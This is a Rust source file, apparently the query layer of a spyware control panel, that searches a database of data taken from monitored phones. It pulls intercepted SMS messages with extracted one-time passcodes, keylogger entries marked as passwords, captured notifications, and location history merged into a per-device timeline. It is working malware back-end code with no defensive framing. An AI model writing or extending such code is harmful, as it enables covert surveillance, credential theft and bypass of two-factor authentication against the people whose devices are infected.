// [context: Rust, Linux/x64, query interface for panel data access]

use sqlx::PgPool;
use thiserror::Error;
use uuid::Uuid;
use crate::data::ingest::{SmsRecord, KeylogEntry, NotifRecord};
use serde::{Deserialize, Serialize};

#[derive(Error, Debug)]
pub enum SearchError {
    #[error("database error: {0}")]
    Db(#[from] sqlx::Error),
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DateRange {
    pub start: i64,
    pub end: i64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct TimelineEvent {
    pub timestamp: i64,
    pub event_type: String,
    pub summary: String,
    pub metadata: serde_json::Value,
}

pub struct DataSearch {
    pool: PgPool,
}

impl DataSearch {
    pub fn new(pool: PgPool) -> Self {
        Self { pool }
    }

    pub async fn search_sms(
        &self,
        device_id: &str,
        query: Option<&str>,
        date_range: Option<&DateRange>,
    ) -> Result<Vec<SmsRecord>, SearchError> {
        let did = Uuid::parse_str(device_id).unwrap_or_default();
        let rows = sqlx::query!(
            r#"SELECT sender, body, extract(epoch from received_at)::bigint as received_at, is_otp, extracted_otp
               FROM sms_messages
               WHERE device_id = $1
                 AND ($2::text IS NULL OR body ILIKE '%' || $2 || '%')
               ORDER BY received_at DESC
               LIMIT 200"#,
            did,
            query
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(|r| SmsRecord {
            sender: r.sender.clone(),
            body: r.body.clone(),
            received_at: r.received_at.unwrap_or(0) as u64,
            is_otp: r.is_otp,
            extracted_otp: r.extracted_otp.clone(),
        }).collect())
    }

    pub async fn search_keylogs(
        &self,
        device_id: &str,
        app_filter: Option<&str>,
    ) -> Result<Vec<KeylogEntry>, SearchError> {
        let did = Uuid::parse_str(device_id).unwrap_or_default();
        let rows = sqlx::query!(
            r#"SELECT app_package, field_type, content, is_password,
                      extract(epoch from captured_at)::bigint as captured_at
               FROM keylog_entries
               WHERE device_id = $1
                 AND ($2::text IS NULL OR app_package = $2)
               ORDER BY captured_at DESC
               LIMIT 500"#,
            did,
            app_filter
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(|r| KeylogEntry {
            app_package: r.app_package.clone(),
            field_type: r.field_type.clone(),
            content: r.content.clone(),
            is_password: r.is_password,
            captured_at: r.captured_at.unwrap_or(0) as u64,
        }).collect())
    }

    pub async fn search_notifications(
        &self,
        device_id: &str,
        pkg_filter: Option<&str>,
    ) -> Result<Vec<NotifRecord>, SearchError> {
        let did = Uuid::parse_str(device_id).unwrap_or_default();
        let rows = sqlx::query!(
            r#"SELECT package_name, title, body, extract(epoch from posted_at)::bigint as posted_at
               FROM notifications
               WHERE device_id = $1
                 AND ($2::text IS NULL OR package_name = $2)
               ORDER BY posted_at DESC
               LIMIT 500"#,
            did,
            pkg_filter
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(|r| NotifRecord {
            package_name: r.package_name.clone(),
            title: r.title.clone(),
            body: r.body.clone(),
            posted_at: r.posted_at.unwrap_or(0) as u64,
        }).collect())
    }

    pub async fn get_device_timeline(
        &self,
        device_id: &str,
        start: i64,
        end: i64,
    ) -> Result<Vec<TimelineEvent>, SearchError> {
        let did = Uuid::parse_str(device_id).unwrap_or_default();
        // unified timeline from multiple tables
        let rows = sqlx::query!(
            r#"SELECT 'sms' as event_type, extract(epoch from received_at)::bigint as ts,
                      sender as summary, '{}'::jsonb as metadata
               FROM sms_messages
               WHERE device_id = $1
                 AND received_at BETWEEN to_timestamp($2) AND to_timestamp($3)
               UNION ALL
               SELECT 'location', extract(epoch from captured_at)::bigint,
                      concat(lat::text, ',', lng::text),
                      json_build_object('lat', lat, 'lng', lng)::jsonb
               FROM location_history
               WHERE device_id = $1
                 AND captured_at BETWEEN to_timestamp($2) AND to_timestamp($3)
               ORDER BY ts DESC
               LIMIT 1000"#,
            did, start as f64, end as f64
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(|r| TimelineEvent {
            timestamp: r.ts.unwrap_or(0),
            event_type: r.event_type.clone().unwrap_or_default(),
            summary: r.summary.clone().unwrap_or_default(),
            metadata: r.metadata.clone().unwrap_or(serde_json::Value::Null),
        }).collect())
    }
}
